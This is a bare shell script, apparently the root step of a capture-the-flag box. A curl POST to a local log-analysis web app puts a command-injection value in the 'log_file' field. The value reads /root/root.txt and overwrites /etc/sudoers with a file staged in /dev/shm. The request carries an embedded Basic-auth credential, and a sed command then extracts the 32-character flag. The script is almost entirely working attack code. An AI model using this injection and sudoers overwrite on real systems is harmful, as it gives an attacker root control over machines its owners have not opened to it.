curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:8080 ' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' \
    -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
    -H $'Accept-Language: en-US,en;q=0.5' \
    -H $'Accept-Encoding: gzip, deflate, br' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -H $'Content-Length: 68' \
    -H $'Origin: http://127.0.0.1:8882' \
    -H $'Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==' \
    -H $'Connection: close' \
    -H $'Referer: http://127.0.0.1:8080/' \
    -H $'Upgrade-Insecure-Requests: 1' \
    -H $'Sec-Fetch-Dest: document' \
    -H $'Sec-Fetch-Mode: navigate' \
    -H $'Sec-Fetch-Site: same-origin' \
    -H $'Sec-Fetch-User: ?1' \
    --data-binary $'log_file=/root/root.txt;cp/dev/shm/sudoers> /etc/sudoers&analyze_log' \
    $'http://127.0.0.1:8080/' > 1.txt

sed -n '/<button[^>]*>Analyze<\/button>/, /[a-f0-9]\{32\}/p' 1.txt > root.txt

